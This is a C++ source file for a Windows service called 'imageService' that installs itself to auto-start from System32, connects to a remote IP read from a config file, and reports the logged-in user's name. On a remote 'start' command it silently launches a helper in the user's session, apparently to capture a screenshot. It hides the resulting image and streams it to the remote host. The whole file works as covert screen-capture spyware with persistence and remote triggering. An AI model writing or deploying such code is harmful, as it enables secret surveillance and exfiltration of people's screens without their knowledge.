#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <winsock.h>
#include <sys/types.h>
#include <sstream>
#include <tlhelp32.h>
#include <cstdio>
#include <comdef.h>
#include <stdio.h>
#include <gdiplus.h>
#include <ctime>
#include <Wtsapi32.h>
#include <userenv.h>
#include <vector>

#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "GdiPlus.lib")
#pragma warning( disable : 4996)
using namespace Gdiplus;

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

const wchar_t* serviceName = L"imageService";
const wchar_t* servicePath = L"C:\\Windows\\System32\\ImageService.exe";
SOCKET s;
bool stopped = false;

void writeLog(const char* str);

void StopProc(const char* exename)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			_bstr_t b(entry.szExeFile);
			const char* c = b;
			if (stricmp(c, exename) == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, entry.th32ProcessID);

				if (!hProcess)
				{
					std::stringstream ss;
					ss << GetLastError();
					std::string error = ss.str();
					std::string temp = "hProcess == INVALID_HANDLE_VALUE ERROR: " + error;
					writeLog(&temp[0]);
					return;
				}

				if (!TerminateProcess(hProcess, 0))
				{
					std::stringstream ss;
					ss << GetLastError();
					std::string error = ss.str();
					std::string temp = "TerminateProcess ERROR: " + error;
					writeLog(&temp[0]);
				}

				CloseHandle(hProcess);
			}
		}
	}

	CloseHandle(snapshot);
}

BOOL ControlSampleService(DWORD fdwControl)
{
	SERVICE_STATUS ssStatus;
	DWORD fdwAccess;
	DWORD dwStartTickCount, dwWaitTime;
	DWORD state;

	switch (fdwControl)
	{
	case SERVICE_CONTROL_STOP:
		fdwAccess = SERVICE_STOP;
		state = SERVICE_STOPPED;
		stopped = true;
		closesocket(s);
		break;

	case SERVICE_CONTROL_PAUSE:
	case SERVICE_CONTROL_CONTINUE:
		fdwAccess = SERVICE_PAUSE_CONTINUE;
		if (fdwControl == SERVICE_CONTROL_PAUSE)
			state = SERVICE_PAUSED;
		if (fdwControl == SERVICE_CONTROL_CONTINUE)
			state = SERVICE_CONTINUE_PENDING;
		break;

	case SERVICE_CONTROL_INTERROGATE:
		fdwAccess = SERVICE_INTERROGATE;
		break;

	default:
		fdwAccess = SERVICE_INTERROGATE;
	}

	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!hSCManager)
		return -1;

	SC_HANDLE schService = OpenService(hSCManager, serviceName, fdwAccess);
	if (schService == NULL)
		return FALSE;

	serviceStatus.dwCurrentState = state;
	SetServiceStatus(serviceStatusHandle, &serviceStatus);

	if (!ControlService(schService, fdwControl, &ssStatus))
		return FALSE;

	return TRUE;
}

void StopService()
{
	StopProc("loop.exe");
	StopProc("bReader.exe");

	if (ControlSampleService(SERVICE_CONTROL_STOP))
		writeLog("Service stopped");
	else
		writeLog("Service stop ERROR");
}

void writeLog(const char* str)
{
	std::ofstream file;
	file.open("C:\\log.txt", std::ios::app);
	file << str << '\n';
	file.close();
}

int InstallService()
{
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

	if (!hSCManager) {
		writeLog("Error: Can't open Service Control Manager");
		return -1;
	}

	SC_HANDLE hService = CreateService(
		hSCManager,
		serviceName,
		serviceName,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		servicePath,
		NULL, NULL, NULL, NULL, NULL
	);

	if (!hService) {
		int err = GetLastError();

		switch (err)
		{
		case ERROR_ACCESS_DENIED:
			writeLog("Error: ERROR_ACCESS_DENIED");
			break;
		case ERROR_CIRCULAR_DEPENDENCY:
			writeLog("Error: ERROR_CIRCULAR_DEPENDENCY");
			break;
		case ERROR_DUPLICATE_SERVICE_NAME:
			writeLog("Error: ERROR_DUPLICATE_SERVICE_NAME");
			break;
		case ERROR_INVALID_HANDLE:
			writeLog("Error: ERROR_INVALID_HANDLE");
			break;
		case ERROR_INVALID_NAME:
			writeLog("Error: ERROR_INVALID_NAME");
			break;
		case ERROR_INVALID_PARAMETER:
			writeLog("Error: ERROR_INVALID_PARAMETER");
			break;
		case ERROR_INVALID_SERVICE_ACCOUNT:
			writeLog("Error: ERROR_INVALID_SERVICE_ACCOUNT");
			break;
		case ERROR_SERVICE_EXISTS:
			writeLog("Error: ERROR_SERVICE_EXISTS");
			break;
		default:
			writeLog("Error: Undefined");
		}
		CloseServiceHandle(hSCManager);
		return -1;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	writeLog("Success install service!");
	return 0;
}

int RemoveService()
{
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager) {
		writeLog("Error: Can't open Service Control Manager");
		return -1;
	}
	SC_HANDLE hService = OpenService(hSCManager, serviceName, SERVICE_STOP | DELETE);
	if (!hService) {
		writeLog("Error: Can't remove service");
		CloseServiceHandle(hSCManager);
		return -1;
	}

	DeleteService(hService);
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	writeLog("Success remove service!");
	return 0;
}

int StartServicee()
{
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE hService = OpenService(hSCManager, serviceName, SERVICE_START);

	if (!hService)
	{
		writeLog("Error: Can't open service");
		return -1;
	}

	if (!StartService(hService, 0, NULL))
	{
		CloseServiceHandle(hSCManager);
		int error = GetLastError();

		if (error == ERROR_ACCESS_DENIED)
			std::cout << "ERROR_ACCESS_DENIED\n";
		if (error == ERROR_INVALID_HANDLE)
			std::cout << "ERROR_INVALID_HANDLE\n";
		if (error == ERROR_PATH_NOT_FOUND)
			std::cout << "ERROR_PATH_NOT_FOUND\n";
		if (error == ERROR_SERVICE_ALREADY_RUNNING)
			std::cout << "ERROR_SERVICE_ALREADY_RUNNING\n";
		if (error == ERROR_SERVICE_DATABASE_LOCKED)
			std::cout << "ERROR_SERVICE_DATABASE_LOCKED\n";
		if (error == ERROR_SERVICE_DEPENDENCY_DELETED)
			std::cout << "ERROR_SERVICE_DEPENDENCY_DELETED\n";
		if (error == ERROR_SERVICE_DEPENDENCY_FAIL)
			std::cout << "ERROR_SERVICE_DEPENDENCY_FAIL\n";
		if (error == ERROR_SERVICE_DISABLED)
			std::cout << "ERROR_SERVICE_DISABLED\n";
		if (error == ERROR_SERVICE_LOGON_FAILED)
			std::cout << "ERROR_SERVICE_LOGON_FAILED\n";
		if (error == ERROR_SERVICE_MARKED_FOR_DELETE)
			std::cout << "ERROR_SERVICE_MARKED_FOR_DELETE\n";
		if (error == ERROR_SERVICE_NO_THREAD)
			std::cout << "ERROR_SERVICE_NO_THREAD\n";
		if (error == ERROR_SERVICE_REQUEST_TIMEOUT)
			std::cout << "ERROR_SERVICE_REQUEST_TIMEOUT\n";
		std::cout << GetLastError() << std::endl;;
		writeLog("Error: Can't start service");

		return -1;
	}

	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(serviceStatusHandle, &serviceStatus);

	writeLog("Service started!");
	stopped = false;
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return 0;
}

DWORD GetCurrentSessioId()
{
	WTS_SESSION_INFO* pSessionInfo;
	DWORD n_sessions = 0;
	BOOL ok = WTSEnumerateSessions(WTS_CURRENT_SERVER, 0, 1, &pSessionInfo, &n_sessions);
	if (!ok)
		return 0;

	DWORD SessionId = 0;

	for (DWORD i = 0; i < n_sessions; ++i)
	{
		if (pSessionInfo[i].State == WTSActive)
		{
			SessionId = pSessionInfo[i].SessionId;
			break;
		}
	}

	WTSFreeMemory(pSessionInfo);
	return SessionId;
}

bool LaunchProcess(const char* process_path, const char* arg, bool show, bool wait = true)
{
	//LaunchProcess("C:\\Users\\mi_ai\\source\\repos\\ServiceDebager\\x64\\Release\\ServiceDebager.exe", username, true);
	DWORD SessionId = GetCurrentSessioId();
	if (SessionId == 0)    // no-one logged in
		return false;

	HANDLE hToken;
	BOOL ok = WTSQueryUserToken(SessionId, &hToken);
	if (!ok)
	{
		writeLog("WTSQueryUserToke ERROR");
		return false;
	}

	void* environment = NULL;
	ok = CreateEnvironmentBlock(&environment, hToken, TRUE);

	if (!ok)
	{
		CloseHandle(hToken);
		writeLog("CreateEnvironmentBlock ERROR");
		return false;
	}

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { };

	si.lpDesktop = (LPSTR)"winsta0\\default";

	// Do NOT want to inherit handles here
	// CREATE_NO_WINDOW
	DWORD dwCreationFlags = 0;
	if (!show)
		dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW;
	else
		dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT;
	ok = CreateProcessAsUserA(hToken, process_path, (LPSTR)arg, NULL, NULL, FALSE,
		dwCreationFlags, environment, NULL, &si, &pi);

	DestroyEnvironmentBlock(environment);
	CloseHandle(hToken);

	if (!ok)
	{
		int error = GetLastError();
		std::stringstream ss2;
		ss2 << error;
		writeLog("CreateProcessAsUser ERROR");
		writeLog(&ss2.str()[0]);

		return false;
	}

	if (wait)
		WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return true;
}

void GetName(char* UserName)
{
	FILE* fp = _popen("tasklist /v /FI \"IMAGENAME eq explorer.exe\" /FO \"list\"", "r");

	if (fp) {
		std::vector<char> buffer(4096);
		std::size_t n = fread(buffer.data(), 1, buffer.size(), fp);
		int i = 0;
		int cur = 0;
		while (buffer[i] != '\\') ++i;

		while (buffer[++i] != '\n' && i < buffer.size())
			UserName[cur++] = buffer[i];
		UserName[cur] = '\0';
		_pclose(fp);
	}
}

BOOL Online(int port, std::string& ip, const char* command)
{
	SOCKET cs;
	WSADATA WsaData;
	char username[100];
	char beforeName[100] = "##name##";
	DWORD username_len = 100;
	int check = 0;
	char buf[1];

	if (WSAStartup(0x0101, &WsaData))
		return false;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (s == INVALID_SOCKET)
		return FALSE;

	SOCKADDR_IN sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.S_un.S_addr = inet_addr(&ip[0]);

	if (connect(s, (struct sockaddr*) & sin, sizeof(struct sockaddr)))
		return FALSE;

	GetName(username);

	check = send(s, beforeName, 100, 0);
	if (check != username_len)
	{
		writeLog("sending error");
		closesocket(s);
		return false;
	}

	check = send(s, username, 100, 0);
	if (check != username_len)
	{
		writeLog("sending error");
		closesocket(s);
		return false;
	}

	char cstart[100] = "start";
	char b[50];

	while (true)
	{
		//LaunchProcess("C:\\Users\\mi_ai\\source\\repos\\ServiceDebager\\x64\\Release\\ServiceDebager.exe", "!!!", true);
		if (SOCKET_ERROR == send(s, buf, 0, 0))
			return false;

		check = recv(s, b, 50, MSG_PEEK);
		if (check == 50)
		{
			if (!strcmp(cstart, b))
			{
				char buffer[1024];
				char start[50];
				DWORD check = 0;

				std::string temp;
				std::string temp2;
				std::string savename;
				std::string jpjname;

				savename = "C:\\Users\\Public\\Pictures\\";
				jpjname = "C:\\Users\\Public\\Pictures\\";

				std::stringstream ss;
				std::stringstream st;
				st << time(NULL);
				ss << st.rdbuf();
				temp += ss.str();
				temp += ".png";
				temp2 += ss.str();
				temp2 += ".jpg";
				savename += ss.str();
				savename += ".png";
				jpjname += ss.str();
				jpjname += ".jpg";

				/////////////////////////////////////////////////////////////////////////////////////////

				LaunchProcess(&command[0], &st.str()[0], false);

				//////////////////////////////////////////////////////////////////////////////////////////

				char tt[100];
				OemToCharA(&jpjname[0], tt);
				HANDLE rFile = CreateFileA(tt, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
				SetFileAttributesA(tt, FILE_ATTRIBUTE_HIDDEN);

				if (rFile == INVALID_HANDLE_VALUE)
				{
					closesocket(s);
					return false;
				}

				LARGE_INTEGER tSize = { 0 };
				GetFileSizeEx(rFile, &tSize);
				long int size = tSize.QuadPart;
				int parts = size / 1024;
				int last = size - 1024 * parts;

				if (size)
				{
					std::stringstream ss2;
					ss2 << parts;
					temp += '\n';
					temp += ss2.str();
					temp += '\n';
					std::stringstream ss3;
					ss3 << last;
					temp += ss3.str();
					int i = 0;
					if (temp.size() > 0)
					{
						while (i < temp.size())
							start[i] = temp[i++];
						start[i] = '\0';
					}
					else
					{
						CloseHandle(rFile);
						closesocket(s);
						return 0;
					}

					///////////////////////////////////////////////////conection

					int n = 0;
					int t = 1024;
					char cstart[50] = "start";

					if (50 != send(s, cstart, 50, 0))
					{
						writeLog("sending error");
						CloseHandle(rFile);
						closesocket(s);
						return false;
					}

					if (50 != send(s, start, 50, 0))
					{
						writeLog("sending error");
						CloseHandle(rFile);
						closesocket(s);
						return false;
					}

					while (n < parts)
					{
						if (ReadFile(rFile, buffer, 1024, &check, NULL))
						{
							if (check != 1024)
							{
								CloseHandle(rFile);
								closesocket(s);
								writeLog("reading error");
								return 0;
							}
						}
						else
						{
							CloseHandle(rFile);
							closesocket(s);
							return false;
						}

						if (t != send(s, buffer, t, 0))
						{
							writeLog("sending error");
							CloseHandle(rFile);
							closesocket(s);
							return false;
						}
						n++;
					}

					if (ReadFile(rFile, buffer, last, &check, NULL))
					{
						if (check != last)
						{
							CloseHandle(rFile);
							closesocket(s);
							writeLog("reading last error");
							return 0;
						}
					}
					else
					{
						CloseHandle(rFile);
						closesocket(s);
						return 0;
					}

					if (last != send(s, buffer, last, 0))
					{
						writeLog("sending last part error");
						CloseHandle(rFile);
						closesocket(s);
						return false;
					}
				}

				CloseHandle(rFile);
			}
		}
		else
			return false;
	}

	closesocket(s);

	return TRUE;
}

void WINAPI ServiceMain(int argc, char* argv[])
{
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = 0;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;

	serviceStatusHandle = RegisterServiceCtrlHandler(serviceName, (LPHANDLER_FUNCTION)StopService);

	if (!serviceStatusHandle)
	{
		writeLog("Error of registrating Service status");
		return;
	}

	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(serviceStatusHandle, &serviceStatus);

	std::string ip;
	std::string port;

	std::ifstream file2("imageConf.txt");

	int i = 0;
	char a;
	char getinfo[100];

	while (!file2.eof())
	{
		file2.get(a);
		getinfo[i] = a;
		++i;
	}

	getinfo[i] = '\0';
	file2.close();

	i = 1;
	while (getinfo[i] != ' ')
		port += getinfo[i++];
	++i;
	while (getinfo[i] != '\0')
		ip += getinfo[i++];
	ip.resize(ip.size() - 1);

	std::string command = "C:\\Windows\\System32\\loop.exe";

	std::string com = port + ip;
	char adress[MAX_PATH] = "C:\\Windows\\System32\\bReader.exe";
	Sleep(20000);
	LaunchProcess(adress, &com[0], false, false);

	try
	{
		while (true)
		{
			Sleep(5000);
			if (!stopped)
				Online(std::stoi(port), ip, &command[0]);
		}
	}
	catch (const std::exception& e) 
	{
		std::string text = "Main exeption: ";
		text += e.what();
		writeLog(text.c_str());
	}

	return;
}

int main(int argc, char* argv[])
{
	if (argc - 1 == 0)
	{
		SERVICE_TABLE_ENTRY ServiceTable;
		ServiceTable.lpServiceName = (LPWSTR)serviceName;
		ServiceTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

		if (!StartServiceCtrlDispatcher(&ServiceTable))
		{
			writeLog("Error: StartServiceCtrlDispatcher");
		}
	}
	else if (strcmp(argv[argc - 1], ("install")) == 0)
		InstallService();
	else if (strcmp(argv[argc - 1], ("remove")) == 0)
		RemoveService();
	else if (strcmp(argv[argc - 1], ("start")) == 0)
		StartServicee();
	else if (strcmp(argv[argc - 1], ("stop")) == 0)
		StopService();
}